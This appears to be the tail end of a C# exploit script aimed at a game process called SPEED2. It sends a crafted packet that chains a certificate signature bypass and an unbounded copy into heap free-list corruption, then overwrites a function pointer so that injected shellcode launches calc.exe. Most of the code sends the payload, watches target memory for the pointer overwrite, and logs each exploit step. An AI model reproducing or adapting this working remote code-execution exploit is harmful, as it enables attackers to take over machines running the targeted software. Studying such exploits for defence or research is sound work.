        Array.Copy(copyData, 0, packet, p, (int)copyLen);

        Log("Packet: " + totalLen + " bytes (asn1=" + asn1Len + " copyData=" + copyLen + ")");
        Log("");
        Log("EXPLOIT CHAIN:");
        Log("  1. Cert processed in state 0xb -> CA match + signature bypass");
        Log("  2. Unbounded copy: " + copyLen + " bytes from ke+0x81D4");
        Log("  3. Overwrites free node: next=0x" + fakeNext.ToString("X8") + " prev=0x" + fakePrevAddr.ToString("X8"));
        Log("  4. Writes fake prev node at 0x" + fakePrevAddr.ToString("X8") + " (bridge + shellcode)");
        Log("  5. TCP close -> KE freed -> INSERT + forward coalesce -> PTR_FUN = keBlock (temp)");
        Log("  6. Backward coalesce: size wraps -> *(PTR_FUN) = 0x" + fakePrevAddr.ToString("X8") + " (FINAL)");
        Log("  7. 0xEE fill covers [0x" + keBlock.ToString("X8") + ", 0x" + (freeNode + 16).ToString("X8") +
            ") -- shellcode at 0x" + fakePrevAddr.ToString("X8") + " SAFE");
        Log("  8. Next alloc -> JMP [PTR_FUN] -> bridge -> MessageBox + calc.exe");
        Log("");

        // SEND THE EXPLOIT PACKET
        Log(">>> SENDING EXPLOIT PACKET <<<");
        try {
            stream.Write(packet, 0, packet.Length);
            stream.Flush();
            Log("Sent " + packet.Length + " bytes");
        } catch (Exception ex) {
            Log("FAIL: " + ex.Message);
            client.Close(); server.Stop();
            return;
        }

        // ----------------------------------------------------------------
        // STEP 9: Close TCP to trigger KE free, then monitor for the shoot
        // ----------------------------------------------------------------
        Thread.Sleep(1000);
        Log("Closing TCP to trigger KE free...");
        try { stream.Close(); } catch {}
        try { client.Close(); } catch {}
        try { server.Stop(); } catch {}

        // Monitor PTR_FUN for changes (the DWORD shoot)
        Log("Monitoring PTR_FUN...");
        bool triggered = false;

        for (int poll = 0; poll < 90; poll++) {
            Thread.Sleep(500);

            // Check if game is still running
            bool alive = false;
            try { alive = Process.GetProcessesByName("SPEED2").Length > 0; } catch {}
            if (!alive) { Log("Game exited at poll " + poll); break; }

            uint val = Rd32(PTR_FUN);
            if (val != PTR_FUN_ORIG) {
                // PTR_FUN changed — the DWORD shoot fired!
                bool isTarget = (val == fakePrevAddr);
                Log(">>> DWORD SHOOT! PTR_FUN = 0x" + val.ToString("X8") +
                    (isTarget ? " -> SHELLCODE ADDRESS (correct!)" :
                     val == keBlock ? " -> keBlock (backward coalesce didn't fire)" :
                     val == 0 ? " -> NULL (SEH recovery)" : " -> UNKNOWN"));
                triggered = true;

                if (isTarget) {
                    // Verify shellcode survived the 0xEE fill
                    byte[] scCheck = Rd((IntPtr)(fakePrevAddr + 12), 8);
                    Log("  Shellcode bytes @fakePrev+12: " + BitConverter.ToString(scCheck).Replace("-", " "));
                    bool intact = (scCheck[0] == 0xE8); // CALL $+5 opcode
                    Log("  Shellcode " + (intact ? "INTACT -- executing!" : "DESTROYED (0xEE fill reached it)"));
                }

                // Wait for shellcode to execute and restore PTR_FUN
                Thread.Sleep(3000);
                val = Rd32(PTR_FUN);
                if (val == PTR_FUN_ORIG)
                    Log(">>> PTR_FUN RESTORED -- SHELLCODE EXECUTED SUCCESSFULLY <<<");
                else
                    Log("  PTR_FUN after 3s: 0x" + val.ToString("X8"));
                break;
            }

            // Periodic diagnostics (polls 2 and 4)
            if (poll == 2 || poll == 4) {
                byte[] fnData = Rd((IntPtr)freeNode, 20);
                uint fn0  = BitConverter.ToUInt32(fnData, 0);
                uint fn4  = BitConverter.ToUInt32(fnData, 4);
                uint fn8  = BitConverter.ToUInt32(fnData, 8);
                uint fn12 = BitConverter.ToUInt32(fnData, 12);
                uint fn16 = BitConverter.ToUInt32(fnData, 16);

                Log("  FreeNode: [0]=0x" + fn0.ToString("X8") +
                    " [4]=0x" + fn4.ToString("X8") +
                    " [8]=0x" + fn8.ToString("X8") +
                    " [C]=0x" + fn12.ToString("X8") +
                    " [10]=0x" + fn16.ToString("X8"));

                byte[] fpData = Rd((IntPtr)fakePrevAddr, 16);
                Log("  FakePrev: " + BitConverter.ToString(fpData).Replace("-", " "));

                byte[] scData = Rd((IntPtr)(fakePrevAddr + 12), 8);
                Log("  SC @fp+12: " + BitConverter.ToString(scData).Replace("-", " ") +
                    (scData[0] == 0xE8 ? " (CALL intact)" : " (modified!)"));

                uint cryptoFlag = Rd32(ke + 0x80A8);
                Log("  Crypto: 0x" + cryptoFlag.ToString("X8"));

                if (fn0 == fakeNext && fn4 == fakePrevAddr)
                    Log("  >>> Fake node in place. DWORD shoot pending on KE free...");
                else if (fn12 != FMAGIC)
                    Log("  >>> Free node modified (magic gone) -- KE may already be freed");
            }

            if (poll % 10 == 9)
                Log("  ... monitoring (poll " + (poll + 1) + "/90)");
        }

        // Final diagnostics if the shoot didn't trigger
        if (!triggered) {
            Log("DWORD shoot not detected in 45s");
            uint postVal = Rd32(PTR_FUN);
            Log("PTR_FUN final: 0x" + postVal.ToString("X8"));
            byte[] postFN = Rd((IntPtr)freeNode, 16);
            Log("FreeNode final: " + BitConverter.ToString(postFN).Replace("-", " "));
            byte[] postFP = Rd((IntPtr)fakePrevAddr, 16);
            Log("FakePrev final: " + BitConverter.ToString(postFP).Replace("-", " "));
        }

        Log("=== DONE ===");
        if (hProc != IntPtr.Zero) CloseHandle(hProc);
    }
}
